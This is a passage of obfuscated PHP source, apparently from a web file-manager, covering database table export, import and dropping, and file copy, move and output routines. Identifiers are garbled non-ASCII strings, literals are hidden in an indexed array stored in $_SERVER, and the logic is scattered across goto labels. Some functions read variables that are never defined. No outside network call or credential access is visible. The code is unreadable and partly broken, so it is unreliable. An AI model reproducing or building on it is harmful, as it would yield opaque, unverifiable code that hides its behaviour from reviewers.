$this->model()->db()->execute($C¸¸Ö‡îĞĞ); if ($D†£Åã¶‰Î && $FÁÓÔğƒÖè) { preg_match($c¶šÓÄí×’[968], $C¸¸Ö‡îĞĞ, $AÏÚì¦); $D†£Åã¶‰Î->task[$c¶šÓÄí×’[969]] = $AÏÚì¦[1]; $D†£Åã¶‰Î->update(1); } } $this->taskToCache($D†£Åã¶‰Î); } public function insertTable($BàØ…±…«Ô, $có©êÌˆÉ¶ = null) { $F„Ö¨ÙÒÚ÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dğÍªã¸Ğ = $this->model()->db(); $B†º°¶ˆª¶ = $aùôÂ¥…ŸÏ ? array($aùôÂ¥…ŸÏ) : $dğÍªã¸Ğ->getTables(); foreach ($BàØ…±…«Ô as $AèÇŒ›¦õ¸) { $aùôÂ¥…ŸÏ = basename($AèÇŒ›¦õ¸, $F„Ö¨ÙÒÚ÷[712]); if (!in_array($aùôÂ¥…ŸÏ, $B†º°¶ˆª¶)) { continue; } if ($có©êÌˆÉ¶) { $có©êÌˆÉ¶->task[$F„Ö¨ÙÒÚ÷[969]] = $aùôÂ¥…ŸÏ; } if (get_filesize($AèÇŒ›¦õ¸) == 0) { continue; } $AÛ†¨ÕÊñˆ = $this->sqlToDb($AèÇŒ›¦õ¸, $có©êÌˆÉ¶); if (!$AÛ†¨ÕÊñˆ) { ActionCall($F„Ö¨ÙÒÚ÷[964], !0, 0); show_json(LNG($F„Ö¨ÙÒÚ÷[970]) . "\x5b{$aùôÂ¥…ŸÏ}\x5d", !1); } } $this->taskToCache($có©êÌˆÉ¶); } public function sqlFromDb($cà¢ÆÇÔè, $FÊ¾¼ô§ÙÌ, $B°ò—˜æŒ˜ = null, $EØ¶‰É’£ß = null) { goto cÇğ»’; DÍ¤áœ›: $BÉÇ¢„¾§ = $AÄ«ª…ñÊÆ->getPk(); $FÔƒÒæ·àæ = $AÄ«ª…ñÊÆ->getDbFields(); do { $cÅòÁåîÖÓ = $AÄ«ª…ñÊÆ->field($FÔƒÒæ·àæ)->order($BÉÇ¢„¾§ . $_SERVER[¹÷ˆ§éÒ°ú][972])->selectPage($Dš´ğšñÂ×, $báö‹ÛˆÓá); $d¢¤É…‰ = isset($cÅòÁåîÖÓ[$_SERVER[¹÷ˆ§éÒ°ú][362]][$_SERVER[¹÷ˆ§éÒ°ú][364]]) ? $cÅòÁåîÖÓ[$_SERVER[¹÷ˆ§éÒ°ú][362]][$_SERVER[¹÷ˆ§éÒ°ú][364]] : 0; $C¸¦ğÜåˆ = !empty($cÅòÁåîÖÓ[$_SERVER[¹÷ˆ§éÒ°ú][365]]) ? $cÅòÁåîÖÓ[$_SERVER[¹÷ˆ§éÒ°ú][365]] : array(); if (!($cµ³’¼§ÍÍ = count($C¸¦ğÜåˆ))) { break; } $dïÑ«½˜‰ = array(); foreach ($C¸¦ğÜåˆ as $aáµÒˆò·‚) { if ($cà¢ÆÇÔè == $_SERVER[¹÷ˆ§éÒ°ú][973] && $aáµÒˆò·‚[$_SERVER[¹÷ˆ§éÒ°ú][39]] == $_SERVER[¹÷ˆ§éÒ°ú][974]) { $bôØÌã†‚Õ = json_decode($aáµÒˆò·‚[$_SERVER[¹÷ˆ§éÒ°ú][370]], !0); if ($bôØÌã†‚Õ[$_SERVER[¹÷ˆ§éÒ°ú][38]] == date($_SERVER[¹÷ˆ§éÒ°ú][685]) && !$bôØÌã†‚Õ[$_SERVER[¹÷ˆ§éÒ°ú][684]]) { continue; } } if ($EØ¶‰É’£ß) { $aáµÒˆò·‚[$_SERVER[¹÷ˆ§éÒ°ú][87]] = "\x7b\x69\157\x3a{$EØ¶‰É’£ß}\175" . substr($aáµÒˆò·‚[$_SERVER[¹÷ˆ§éÒ°ú][87]], strlen("\x7b\x69\157\x3a{$aáµÒˆò·‚[$_SERVER[¹÷ˆ§éÒ°ú][738]]}\175")); $aáµÒˆò·‚[$_SERVER[¹÷ˆ§éÒ°ú][738]] = $EØ¶‰É’£ß; } $dïÑ«½˜‰[] = $_SERVER[¹÷ˆ§éÒ°ú][975] . $this->sqlEncode($aáµÒˆò·‚) . $_SERVER[¹÷ˆ§éÒ°ú][976]; } $CõˆÂçÃ” = "\111\116\123\105\x52\x54\40\x49\116\124\117\40\x60{$cà¢ÆÇÔè}\140\40\50\x60" . implode($_SERVER[¹÷ˆ§éÒ°ú][977], $FÔƒÒæ·àæ) . $_SERVER[¹÷ˆ§éÒ°ú][978]; fwrite($FÀİ´Ìç¤, $CõˆÂçÃ” . implode($_SERVER[¹÷ˆ§éÒ°ú][979], $dïÑ«½˜‰) . $_SERVER[¹÷ˆ§éÒ°ú][79] . PHP_EOL); $báö‹ÛˆÓá++; $EÄÀÍâÄ° += $cµ³’¼§ÍÍ; if ($B°ò—˜æŒ˜) { $B°ò—˜æŒ˜->update($cµ³’¼§ÍÍ); } } while ($báö‹ÛˆÓá <= $d¢¤É…‰); goto FŞâòÅÓŞ; AğÅÇ¸§È: $báö‹ÛˆÓá = 1; $Dš´ğšñÂ× = 500; $FÀİ´Ìç¤ = fopen($FÊ¾¼ô§ÙÌ, $_SERVER[¹÷ˆ§éÒ°ú][971]); goto DÍ¤áœ›; cÇğ»’: if ($B°ò—˜æŒ˜) { $B°ò—˜æŒ˜->task[$_SERVER[¹÷ˆ§éÒ°ú][969]] = $cà¢ÆÇÔè; } $AÄ«ª…ñÊÆ = $this->model($cà¢ÆÇÔè); $EÄÀÍâÄ° = 0; goto AğÅÇ¸§È; FŞâòÅÓŞ: fclose($FÀİ´Ìç¤); return $EÄÀÍâÄ°; goto E´ÇÅ°”·ê; E´ÇÅ°”·ê: } public function sqlToDb($B“¹İíë³Ö, $dÅÕÓ¿…µ¥ = null) { goto bÆƒà’™°; d¨¸¢×ƒõ£: $cêáóóŸ¢– = 500 + 1; while (!feof($D‘Ñ“‹÷îË)) { if ($dÅÕÓ¿…µ¥ && $d½‘•â¯¶ˆ != 0) { $dÅÕÓ¿…µ¥->task[$a Ô§š°™“[967]] += 1; } $d½‘•â¯¶ˆ++; $b„‚Ô’ùî = trim(fgets($D‘Ñ“‹÷îË)); $fŠº¨¢Á¦ .= $a Ô§š°™“[60] . $this->sqlDecode($b„‚Ô’ùî, $this->type); if ($d½‘•â¯¶ˆ == $cêáóóŸ¢–) { $fŠº¨¢Á¦ = rtrim(trim($fŠº¨¢Á¦), $a Ô§š°™“[79]); if (!$eáÏ†êÁ°·->execute($fŠº¨¢Á¦)) { return !1; } if ($dÅÕÓ¿…µ¥) { $dÅÕÓ¿…µ¥->update($d½‘•â¯¶ˆ - 1); } $fŠº¨¢Á¦ = $a Ô§š°™“[43]; $d½‘•â¯¶ˆ = 0; } } fclose($D‘Ñ“‹÷îË); goto D™Öâ’Ş·È; DÀ£Ï½¡Ù–: if (!$D‘Ñ“‹÷îË) { return !1; } $d½‘•â¯¶ˆ = 0; $fŠº¨¢Á¦ = $a Ô§š°™“[43]; goto d¨¸¢×ƒõ£; bÆƒà’™°: $a Ô§š°™“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eáÏ†êÁ°· = $this->model()->db(); $D‘Ñ“‹÷îË = @fopen($B“¹İíë³Ö, $a Ô§š°™“[980]); goto DÀ£Ï½¡Ù–; D™Öâ’Ş·È: if (trim($fŠº¨¢Á¦)) { $fŠº¨¢Á¦ = rtrim(trim($fŠº¨¢Á¦), $a Ô§š°™“[79]); if (!$eáÏ†êÁ°·->execute($fŠº¨¢Á¦)) { return !1; } if ($dÅÕÓ¿…µ¥) { $dÅÕÓ¿…µ¥->update($d½‘•â¯¶ˆ - 1); } } return !0; goto e£”à£ÇÃ; e£”à£ÇÃ: } public function dropTable($BìÏï‚Ñ– = null) { $E…ë‚Õé†• = $this->model()->db(); $EòâØØÜœĞ = $BìÏï‚Ñ– ? array($BìÏï‚Ñ–) : $E…ë‚Õé†•->getTables(); if (!$EòâØØÜœĞ) { return; } foreach ($EòâØØÜœĞ as $BìÏï‚Ñ–) { $E…ë‚Õé†•->execute("\x64\x72\x6f\x70\40\x74\x61\x62\154\x65\x20\151\146\40\x65\x78\x69\163\164\x73\x20\140{$BìÏï‚Ñ–}\140"); } } private function taskToCache($aÎÎ‹”ù‚Ì = null) { $CËÌƒİŒÅİ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$aÎÎ‹”ù‚Ì) { return; } $eóÍÎÄ›®á = array($CËÌƒİŒÅİ[969] => $aÎÎ‹”ù‚Ì->task[$CËÌƒİŒÅİ[969]], $CËÌƒİŒÅİ[967] => $aÎÎ‹”ù‚Ì->task[$CËÌƒİŒÅİ[967]], $CËÌƒİŒÅİ[981] => $aÎÎ‹”ù‚Ì->task[$CËÌƒİŒÅİ[981]]); if ($eóÍÎÄ›®á[$CËÌƒİŒÅİ[967]] == $eóÍÎÄ›®á[$CËÌƒİŒÅİ[981]]) { $eóÍÎÄ›®á[$CËÌƒİŒÅİ[691]] = 1; } Cache::set($CËÌƒİŒÅİ[982] . $aÎÎ‹”ù‚Ì->task[$CËÌƒİŒÅİ[378]], $eóÍÎÄ›®á); $aÎÎ‹”ù‚Ì->end(); } private function sqlEncode($CÅéáÆØ“­) { $F‰–ô””™ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÄí©êÖí = array(); foreach ($CÅéáÆØ“­ as $b¤îñõ‘ñ†) { if (is_array($b¤îñõ‘ñ†)) { $b¤îñõ‘ñ† = json_encode_force($b¤îñõ‘ñ†); } $b¤îñõ‘ñ† = addslashes($b¤îñõ‘ñ†); $b¤îñõ‘ñ† = str_replace(array($F‰–ô””™[983], $F‰–ô””™[10]), array($F‰–ô””™[984], $F‰–ô””™[985]), $b¤îñõ‘ñ†); $AÄí©êÖí[] = str_replace($F‰–ô””™[67], $F‰–ô””™[986], $b¤îñõ‘ñ†); } return $F‰–ô””™[67] . implode($F‰–ô””™[987], $AÄí©êÖí) . $F‰–ô””™[67]; } private function sqlDecode($CÊòùË÷…Š, $d‰èŒ°—¸Ì) { $aÚíò“°òÏ =& $_SERVER[¹÷ˆ§éÒ°ú]; $CÊòùË÷…Š = str_replace(array($aÚíò“°òÏ[984], $aÚíò“°òÏ[985]), array($aÚíò“°òÏ[983], $aÚíò“°òÏ[10]), $CÊòùË÷…Š); if ($d‰èŒ°—¸Ì == $aÚíò“°òÏ[19]) { $CÊòùË÷…Š = stripslashes($CÊòùË÷…Š); } return $CÊòùË÷…Š; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f˜©åÆµ£‡, $Bèî¬ÀÈ«µ) { $A¸Ù‰¢àæî = self::driverMake($Bèî¬ÀÈ«µ[0]); if (method_exists($A¸Ù‰¢àæî, $f˜©åÆµ£‡)) { return @call_user_func_array(array($A¸Ù‰¢àæî, $f˜©åÆµ£‡), $Bèî¬ÀÈ«µ); } if (method_exists($A¸Ù‰¢àæî, $_SERVER[¹÷ˆ§éÒ°ú][988])) { return @call_user_func_array(array($A¸Ù‰¢àæî, $f˜©åÆµ£‡), $Bèî¬ÀÈ«µ); } else { if (method_exists(self, $f˜©åÆµ£‡)) { return @call_user_func_array(array(self, $f˜©åÆµ£‡), $Bèî¬ÀÈ«µ); } else { call_user_func_array(array(parent, $f˜©åÆµ£‡), $Bèî¬ÀÈ«µ); } } } public static function init($e²éË‰¼”) { return self::driverMake($e²éË‰¼”); } public static function copy($EÖÎçèß»®, $C×ÅÓ…®é, $dåò¼ô¹ò = false, $A‚Ó°ùÛÚ† = false) { return self::copyMove($EÖÎçèß»®, $C×ÅÓ…®é, $dåò¼ô¹ò, $_SERVER[¹÷ˆ§éÒ°ú][503], $A‚Ó°ùÛÚ†); } public static function move($cØªš„Á¿, $c ¶µĞ‘…×, $bæÍ³’ÕË = false, $BÃù¾Ñ÷¤ = false) { return self::copyMove($cØªš„Á¿, $c ¶µĞ‘…×, $bæÍ³’ÕË, $_SERVER[¹÷ˆ§éÒ°ú][505], $BÃù¾Ñ÷¤); } public static function saveFile($Bº¥Œ°Ó—œ, $c’Şöï…ñ, $D¦ª·¹´Æ = true) { goto c÷¯ÒÔƒ»; c÷¯ÒÔƒ»: $AÏó¦åøÅ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Cªˆ·Òœ¶‡ = self::info($c’Şöï…ñ); $f«Ûº›ÃÕ“ = self::driverMake($Bº¥Œ°Ó—œ); goto fÁÀŒÅ¿‡ã; fáãŸŠÛ¤: $E¦õ¡ÒÚ‡— = self::copyFile($f«Ûº›ÃÕ“, $Bº¥Œ°Ó—œ, $dÏÙé¦õ¥…, $FÕŸÕÅô‚, $Cªˆ·Òœ¶‡[$AÏó¦åøÅ[38]], $aâóŸÌÙª©); if ($Cå´‡ÖŞ›¾) { $E¦õ¡ÒÚ‡— = $Cå´‡ÖŞ›¾->getPathOuter($E¦õ¡ÒÚ‡—); } return $E¦õ¡ÒÚ‡—; goto a¨äîŒ‘ˆ÷; fÁÀŒÅ¿‡ã: $dÏÙé¦õ¥… = self::driverMake($c’Şöï…ñ); $Cå´‡ÖŞ›¾ = !1; if ($dÏÙé¦õ¥…->pathParse[$AÏó¦åøÅ[989]]) { $e™øÛ¡¼¹ƒ = $dÏÙé¦õ¥…->pathParse[$AÏó¦åøÅ[989]]; $Cå´‡ÖŞ›¾ = $dÏÙé¦õ¥…; $dÏÙé¦õ¥… = self::driverMake($e™øÛ¡¼¹ƒ); } goto AÉ¹±ÎçÁ—; AÉ¹±ÎçÁ—: $FÕŸÕÅô‚ = $dÏÙé¦õ¥…->pathFather($c’Şöï…ñ); $aâóŸÌÙª© = !0; if (!$D¦ª·¹´Æ && self::driverIsSame($f«Ûº›ÃÕ“, $dÏÙé¦õ¥…)) { $aâóŸÌÙª© = !1; } goto fáãŸŠÛ¤; a¨äîŒ‘ˆ÷: } private static function copyMove($dÎÚÔ‡ñªÒ, $DÇè¬íêà, $FÒ†Öš‚, $fĞÎ½šòã, $b¨½õ¥±Ö¦ = false) { goto Eâå®ù÷”; E÷½Ôªƒæ: Hook::trigger($DÔÑõ¶Ú´ƒ[84], $EÏ×Åìùš, $dÎÚÔ‡ñªÒ, $C‘—®‡÷Ì, $DÇè¬íêà); $aË¾™À«œï = self::driverIsSame($EÏ×Åìùš, $C‘—®‡÷Ì); if ($aË¾™À«œï) { if ($fĞÎ½šòã == $DÔÑõ¶Ú´ƒ[505] && !method_exists($C‘—®‡÷Ì, $DÔÑõ¶Ú´ƒ[990]) && trim($DÇè¬íêà, $DÔÑõ¶Ú´ƒ[18]) == trim($C‘—®‡÷Ì->pathFather($dÎÚÔ‡ñªÒ), $DÔÑõ¶Ú´ƒ[18])) { return $C‘—®‡÷Ì->getPathOuter($dÎÚÔ‡ñªÒ); } if (method_exists($C‘—®‡÷Ì, $fĞÎ½šòã)) { return $C‘—®‡÷Ì->{$fĞÎ½šòã}($dÎÚÔ‡ñªÒ, $DÇè¬íêà, $FÒ†Öš‚); } } goto f¾¨Ó‡Áœ„; Dïæöà×Ö: $eË›¨º×ã = !1; if ($C‘—®‡÷Ì->pathParse[$DÔÑõ¶Ú´ƒ[989]]) { $DÇè¬íêà = $C‘—®‡÷Ì->pathParse[$DÔÑõ¶Ú´ƒ[989]]; $eË›¨º×ã = $C‘—®‡÷Ì; $C‘—®‡÷Ì = self::driverMake($DÇè¬íêà); } self::check($EÏ×Åìùš, $dÎÚÔ‡ñªÒ, $C‘—®‡÷Ì, $DÇè¬íêà); goto E÷½Ôªƒæ; Eâå®ù÷”: $DÔÑõ¶Ú´ƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$dÎÚÔ‡ñªÒ || $dÎÚÔ‡ñªÒ == $DÔÑõ¶Ú´ƒ[18] || !$DÇè¬íêà) { return !1; } ignore_timeout(); goto FÎºİ«“¢ì; fŞÛ•Ş«÷¡: if ($eË›¨º×ã) { $dĞ§Ô¼¡º = $eË›¨º×ã->getPathOuter($dĞ§Ô¼¡º); } return $dĞ§Ô¼¡º; goto D©Ì´‚Œ¢‚; f¾¨Ó‡Áœ„: $bÏ±ë•ùØ¤ = $EÏ×Åìùš->isFile($dÎÚÔ‡ñªÒ); if (!$bÏ±ë•ùØ¤ && $C‘—®‡÷Ì->getType() == $DÔÑõ¶Ú´ƒ[689] && $EÏ×Åìùš->getType() == $DÔÑõ¶Ú´ƒ[114]) { $dĞ§Ô¼¡º = $C‘—®‡÷Ì->copyFolderFromIO($EÏ×Åìùš, $dÎÚÔ‡ñªÒ, $DÇè¬íêà, $FÒ†Öš‚, $b½×ÉãøÉ, $b¨½õ¥±Ö¦); } else { $dĞ§Ô¼¡º = self::copyPath($EÏ×Åìùš, $dÎÚÔ‡ñªÒ, $C‘—®‡÷Ì, $DÇè¬íêà, $FÒ†Öš‚, $b½×ÉãøÉ, $bÏ±ë•ùØ¤, $b¨½õ¥±Ö¦); } if ($dĞ§Ô¼¡º && $b½×ÉãøÉ) { $EÏ×Åìùš->remove($dÎÚÔ‡ñªÒ); } goto fŞÛ•Ş«÷¡; FÎºİ«“¢ì: $EÏ×Åìùš = self::driverMake($dÎÚÔ‡ñªÒ); $C‘—®‡÷Ì = self::driverMake($DÇè¬íêà); $b½×ÉãøÉ = $fĞÎ½šòã == $DÔÑõ¶Ú´ƒ[505]; goto Dïæöà×Ö; D©Ì´‚Œ¢‚: } private static function check($C‰©¢æÔĞ«, $E“‚Åè×®, $Eä¾›–, &$A¼°Î„Óæ‡) { $c¯¦öóœøÑ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (self::driverIsSame($C‰©¢æÔĞ«, $Eä¾›–) && $C‰©¢æÔĞ«->isFolder($E“‚Åè×®) && $C‰©¢æÔĞ«->isParentOf($E“‚Åè×®, $A¼°Î„Óæ‡)) { show_json(LNG($c¯¦öóœøÑ[991]), !1); } if (!$C‰©¢æÔĞ«->exist($E“‚Åè×®)) { show_json(LNG($c¯¦öóœøÑ[113]), !1); } } private static function copyPath($C †“»‘ùÖ, $bÏº«ÔôäÑ, $EåÔ¢µãÂ±, $BÉ³¼ø¼­, $a¿ïÃ‡ŒÖ®, $F©åğ»’¦, $eùø¶²‹°À, $a—ö¨¤ŞÉ… = false) { goto ağ¤·Ü¹; ağ¤·Ü¹: $d£×îñÂë =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÅ¢§š›³¨ = $a—ö¨¤ŞÉ… ? $a—ö¨¤ŞÉ… : $C †“»‘ùÖ->getPathName($C †“»‘ùÖ->pathThis($bÏº«ÔôäÑ)); if ($a¿ïÃ‡ŒÖ®) { $dÍ¼Ì å‚Ì = $EåÔ¢µãÂ±->fileNameExist($BÉ³¼ø¼­, $dÅ¢§š›³¨); $dÅ¢§š›³¨ = $EåÔ¢µãÂ±->fileNameAuto($BÉ³¼ø¼­, $dÅ¢§š›³¨, $a¿ïÃ‡ŒÖ®, !$eùø¶²‹°À); $a¿ïÃ‡ŒÖ® = $dÍ¼Ì å‚Ì ? $a¿ïÃ‡ŒÖ® : !1; } goto cÊÆğ«„Ì; cÊÆğ«„Ì: if ($eùø¶²‹°À) { return self::copyFile($C †“»‘ùÖ, $bÏº«ÔôäÑ, $EåÔ¢µãÂ±, $BÉ³¼ø¼­, $dÅ¢§š›³¨, $F©åğ»’¦); } if ($a¿ïÃ‡ŒÖ® == REPEAT_RENAME_FOLDER) { $a¿ïÃ‡ŒÖ® = !1; } $EÅºÉ±¢šà = rtrim($BÉ³¼ø¼­, $d£×îñÂë[18]) . $d£×îñÂë[18] . $dÅ¢§š›³¨; goto a²ëŠ×œÂÁ; a²ëŠ×œÂÁ: $BŞê½à†œ¦ = $EåÔ¢µãÂ±->mkdir($EåÔ¢µãÂ±->getPath($EÅºÉ±¢šà)); $BÉ³¼ø¼­ = $EåÔ¢µãÂ±->getPathInner($BŞê½à†œ¦); $Fƒö«ÛùÌí = $C †“»‘ùÖ->listPath($bÏº«ÔôäÑ, !0); goto a¾Ã¾¸ŸÖÖ; a¾Ã¾¸ŸÖÖ: $e‹¿Œˆ²‡ = array_merge($Fƒö«ÛùÌí[$d£×îñÂë[85]], $Fƒö«ÛùÌí[$d£×îñÂë[86]]); foreach ($e‹¿Œˆ²‡ as $D¤Š Ïœ¥â) { $BïØ­Ä°†Ù = $D¤Š Ïœ¥â[$d£×îñÂë[39]] == $d£×îñÂë[179]; $bÏº«ÔôäÑ = $C †“»‘ùÖ->getPathInner($D¤Š Ïœ¥â[$d£×îñÂë[87]]); $bÑ£Ãù ²î = self::copyPath($C †“»‘ùÖ, $bÏº«ÔôäÑ, $EåÔ¢µãÂ±, $BÉ³¼ø¼­, $a¿ïÃ‡ŒÖ®, $F©åğ»’¦, $BïØ­Ä°†Ù); if (!$bÑ£Ãù ²î) { write_log($d£×îñÂë[992] . $bÏº«ÔôäÑ . $d£×îñÂë[993] . $BÉ³¼ø¼­, $d£×îñÂë[994]); } } return $BŞê½à†œ¦; goto dÓóïº¬à‹; dÓóïº¬à‹: } private static function copyFile($Fù‰‰œÎĞÊ, $f¶ïæ´¤‰, $B„í¨ ˆ, $BãŠö»Ù¿, $FÉ™šÁ¥æ, $fê…ôñğ§•) { goto F²ƒÆ‹Ş©›; F²ƒÆ‹Ş©›: $eÛâÙâİš =& $_SERVER[¹÷ˆ§éÒ°ú]; $BãŠö»Ù¿ = $B„í¨ ˆ->getPath(rtrim($BãŠö»Ù¿, $eÛâÙâİš[18]) . $eÛâÙâİš[18] . $FÉ™šÁ¥æ); $a‰Ó²èê‘ = $eÛâÙâİš[995] . time() . rand_string(5); goto DåŞ†ÛäÔŠ; e„æ×à‚œ: Hook::trigger($eÛâÙâİš[997], $Fù‰‰œÎĞÊ, $f¶ïæ´¤‰, $B„í¨ ˆ, $BãŠö»Ù¿, $FÉ™šÁ¥æ, $FÎÊ±´¬Ş•); return $FÎÊ±´¬Ş•; goto cĞ¬„µë; bæãëšÖ’«: $B»ÑÏ‰®Îº = $Fù‰‰œÎĞÊ->iconvApp($B»ÑÏ‰®Îº); $FÎÊ±´¬Ş• = $B„í¨ ˆ->upload($BãŠö»Ù¿, $B»ÑÏ‰®Îº, $fê…ôñğ§•); self::remove($BªˆÒ•ÛØØ . $a‰Ó²èê‘); goto e„æ×à‚œ; e»©Âˆ£™: mk_dir($BªˆÒ•ÛØØ); $B»ÑÏ‰®Îº = $BªˆÒ•ÛØØ . $a‰Ó²èê‘; $B»ÑÏ‰®Îº = $Fù‰‰œÎĞÊ->download($f¶ïæ´¤‰, $B»ÑÏ‰®Îº); goto bæãëšÖ’«; DåŞ†ÛäÔŠ: Hook::trigger($eÛâÙâİš[996], $Fù‰‰œÎĞÊ, $f¶ïæ´¤‰, $B„í¨ ˆ, $BãŠö»Ù¿, $FÉ™šÁ¥æ, $a‰Ó²èê‘); if (self::driverIsSame($Fù‰‰œÎĞÊ, $B„í¨ ˆ)) { if ($fê…ôñğ§•) { $FÎÊ±´¬Ş• = $B„í¨ ˆ->moveFile($f¶ïæ´¤‰, $BãŠö»Ù¿); } else { $FÎÊ±´¬Ş• = $B„í¨ ˆ->copyFile($f¶ïæ´¤‰, $BãŠö»Ù¿); } Hook::trigger($eÛâÙâİš[997], $Fù‰‰œÎĞÊ, $f¶ïæ´¤‰, $B„í¨ ˆ, $BãŠö»Ù¿, $FÉ™šÁ¥æ, $FÎÊ±´¬Ş•); return $FÎÊ±´¬Ş•; } $BªˆÒ•ÛØØ = TEMP_FILES; goto e»©Âˆ£™; cĞ¬„µë: } public static function pathFather($DÍ¤ÆİÇ¯ë) { $e×Šƒš•Íâ = IO::init($DÍ¤ÆİÇ¯ë); $a¼Œ©¥ÏÓ = $e×Šƒš•Íâ->pathFather($e×Šƒš•Íâ->path); return $e×Šƒš•Íâ->getPathOuter($a¼Œ©¥ÏÓ); } public static function fileOut($CáÙÆ µ†Ã, $EÅ˜‡¼¶ = false, $AÏ¤¸¹¡Ö = false, $DŒ™ê½°œè = '') { $EäòÃÁà¤› = self::driverMake($CáÙÆ µ†Ã); if ($EäòÃÁà¤›->isFileOutServer()) { return $EäòÃÁà¤›->fileOutServer($CáÙÆ µ†Ã, $EÅ˜‡¼¶, $AÏ¤¸¹¡Ö, $DŒ™ê½°œè); } return $EäòÃÁà¤›->fileOut($CáÙÆ µ†Ã, $EÅ˜‡¼¶, $AÏ¤¸¹¡Ö, $DŒ™ê½°œè); } public static function fileOutImage($e¬î”àñ­ğ, $Cª²Ê³í = 250) { $Eæ¢×èèÎ« = array(250, 600, 1200, 3000); for ($Cˆ—í‰ŞØ = 0; $Cˆ—í‰ŞØ < count($Eæ¢×èèÎ«); $Cˆ—í‰ŞØ++) { if ($Cˆ—í‰ŞØ == 0 && $Cª²Ê³í <= $Eæ¢×èèÎ«[$Cˆ—í‰ŞØ]) { $Cª²Ê³í = $Eæ¢×èèÎ«[$Cˆ—í‰ŞØ]; break; } else { if ($Cª²Ê³í > $Eæ¢×èèÎ«[$Cˆ—í‰ŞØ - 1] && $Cª²Ê³í <= $Eæ¢×èèÎ«[$Cˆ—í‰ŞØ]) { $Cª²Ê³í = $Eæ¢×èèÎ«[$Cˆ—í‰ŞØ]; break; } else { if ($Cˆ—í‰ŞØ == count($Eæ¢×èèÎ«) - 1 && $Cª²Ê³í > $Eæ¢×èèÎ«[$Cˆ—í‰ŞØ]) { $Cª²Ê³í = $Eæ¢×èèÎ«[$Cˆ—í‰ŞØ]; break; } } } } $bóšõÇ„Ÿ = self::driverMake($e¬î”àñ­ğ); if ($bóšõÇ„Ÿ->isFileOutServer()) { return $bóšõÇ„Ÿ->fileOutImageServer($e¬î”àñ­ğ, $Cª²Ê³í); } return $bóšõÇ„Ÿ->fileOutImage($e¬î”àñ­ğ, $Cª²Ê³í); } private static function driverIsSame($B“ŸÎ°»ºè, $F©Å£Ìˆ××) { goto c„“Á§œÃ¯; f±ö±¸¹£Ä: if ($B“ŸÎ°»ºè->pathDriver == $F©Å£Ìˆ××->pathDriver) { return !0; } return !1; goto b¾ áÃß; C©Ç¥Ûßˆ: if ($E«‹İ„™…² != $aİé¶Û—œ¬) { return !1; } if ($E«‹İ„™…² == $E…Åëğ½ä•[689]) { return !0; } if ($E«‹İ„™…² == $E…Åëğ½ä•[114]) { return !0; } goto f±ö±¸¹£Ä; c„“Á§œÃ¯: $E…Åëğ½ä• =& $_SERVER[¹÷ˆ§éÒ°ú]; $E«‹İ„™…² = $B“ŸÎ°»ºè->getType(); $aİé¶Û—œ¬ = $F©Å£Ìˆ××->getType(); goto C©Ç¥Ûßˆ; b¾ áÃß: } public static function copyUpdate($EĞ½Éáæ¢, $bÚ¨Œƒ·ó¯) { goto D¤Ä×‘»‚; b­àßÑ¸ä°: Hook::trigger($eŞ¹¸×ë¢[1001], $EĞ½Éáæ¢, $bÚ¨Œƒ·ó¯, $d¾Ûğ¨Ü»); foreach ($E¾­ôÆÎ“à as $dò¯ğğ‘¡ë) { IO::mkdir($dò¯ğğ‘¡ë); } foreach ($E©ğ™„¼ÒÑ as $dò¯ğğ‘¡ë) { IO::copy($dò¯ğğ‘¡ë[$eŞ¹¸×ë¢[998]], $dò¯ğğ‘¡ë[$eŞ¹¸×ë¢[999]], REPEAT_REPLACE); } goto B¾¯İ×„; D¤Ä×‘»‚: $eŞ¹¸×ë¢ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!IO::exist($EĞ½Éáæ¢)) { return !1; } if (!IO::exist($bÚ¨Œƒ·ó¯)) { IO::mkdir($bÚ¨Œƒ·ó¯); } goto cùİ™ç¾ğ; bù¢´«Æ¬±: $E¾­ôÆÎ“à = array(); foreach ($D“Çó»ÕË¯ as $b¿½ËÖê” => $dò¯ğğ‘¡ë) { if (isset($E¤½ŠËáäØ[$b¿½ËÖê”])) { if ($dò¯ğğ‘¡ë[$eŞ¹¸×ë¢[88]] == 1) { continue; } if ($E¤½ŠËáäØ[$b¿½ËÖê”][$eŞ¹¸×ë¢[89]] == $dò¯ğğ‘¡ë[$eŞ¹¸×ë¢[89]]) { continue; } } if ($dò¯ğğ‘¡ë[$eŞ¹¸×ë¢[88]] == 1) { $E¾­ôÆÎ“à[] = $bÚ¨Œƒ·ó¯ . $eŞ¹¸×ë¢[18] . $b¿½ËÖê”; continue; } $B´Õ›¬Š¿ö = strstr(trim($b¿½ËÖê”, $eŞ¹¸×ë¢[18]), $eŞ¹¸×ë¢[18]) ? get_path_father($b¿½ËÖê”) : $eŞ¹¸×ë¢[43]; $E©ğ™„¼ÒÑ[] = array($eŞ¹¸×ë¢[998] => $dò¯ğğ‘¡ë[$eŞ¹¸×ë¢[87]], $eŞ¹¸×ë¢[999] => rtrim($bÚ¨Œƒ·ó¯, $eŞ¹¸×ë¢[18]) . $eŞ¹¸×ë¢[18] . $B´Õ›¬Š¿ö, $eŞ¹¸×ë¢[1000] => $dò¯ğğ‘¡ë); } $d¾Ûğ¨Ü» = array($eŞ¹¸×ë¢[179] => $E©ğ™„¼ÒÑ, $eŞ¹¸×ë¢[88] => $E¾­ôÆÎ“à); goto b­àßÑ¸ä°; cùİ™ç¾ğ: $D“Çó»ÕË¯ = self::_listAll($EĞ½Éáæ¢); $E¤½ŠËáäØ = self::_listAll($bÚ¨Œƒ·ó¯); $E©ğ™„¼ÒÑ = array(); goto bù¢´«Æ¬±; B¾¯İ×„: } private static function _listAll($d§­ÁÑ‘ßµ) { $d‘÷×Œ†¹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $d§­ÁÑ‘ßµ = KodIO::clear($d§­ÁÑ‘ßµ); $fáŒÑ¨öí¿ = IO::listAll($d§­ÁÑ‘ßµ); foreach ($fáŒÑ¨öí¿ as &$FºîÕß°“Ì) { $CĞÉƒšÓğÃ = substr($FºîÕß°“Ì[$d‘÷×Œ†¹[87]], 